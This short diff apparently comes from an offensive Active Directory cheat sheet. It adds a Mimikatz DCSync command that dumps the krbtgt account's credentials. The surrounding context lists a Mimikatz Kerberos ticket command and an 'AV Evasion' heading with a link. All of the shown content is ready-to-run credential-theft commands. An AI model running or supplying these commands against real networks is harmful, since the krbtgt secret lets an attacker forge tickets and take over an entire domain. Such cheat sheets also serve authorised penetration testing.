@@ -216,6 +216,9 @@ If functions not on remote host:-
 
 ```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```
 
+```Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'```
+
+
 #### AV Evasion
 https://github.com/mitre/caldera/issues/38#issuecomment-396055260
 
